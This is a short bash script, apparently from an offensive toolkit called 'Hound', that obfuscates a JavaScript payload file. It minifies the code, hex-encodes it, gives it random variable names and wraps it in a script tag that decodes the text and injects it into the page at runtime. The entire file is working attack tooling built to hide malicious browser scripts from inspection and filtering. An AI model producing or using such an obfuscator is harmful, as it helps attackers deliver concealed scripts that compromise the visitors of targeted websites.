#!/bin/bash
# Hound v1.0 — Payload Obfuscator
# Converts payload.js → payload_obf.js using multi-layer obfuscation

INFILE="payload.js"
OUTFILE="payload_obf.js"

if [ ! -f "$INFILE" ]; then
    echo "[!] $INFILE not found!"
    exit 1
fi

echo "[*] Obfuscating $INFILE..."

# Step 1: Minify — remove comments and blank lines, trim whitespace
MINIFIED=$(sed '/^[[:space:]]*\/\//d; /^[[:space:]]*$/d; s/^[[:space:]]*//; s/[[:space:]]*$//' "$INFILE" | tr '\n' ' ' | sed 's/  */ /g')

# Step 2: Convert to hex string
HEX=""
for (( i=0; i<${#MINIFIED}; i++ )); do
    CHAR="${MINIFIED:$i:1}"
    HEX_CHAR=$(printf '%%%02x' "'$CHAR")
    HEX="${HEX}${HEX_CHAR}"
done

# Step 3: Generate random variable names
V1=$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)
V2=$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)
V3=$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)

# Step 4: Wrap in multi-layer eval
cat > "$OUTFILE" << ENDOFFILE
<script type="text/javascript">
var ${V1}='$HEX';
var ${V2}=unescape(${V1});
var ${V3}=document.createElement('script');
${V3}.type='text/javascript';
${V3}.text=${V2};
document.body.appendChild(${V3});
</script>
ENDOFFILE

echo "[+] Obfuscated payload saved to $OUTFILE"
echo "[+] Original: $(wc -c < "$INFILE") bytes → Obfuscated: $(wc -c < "$OUTFILE") bytes"
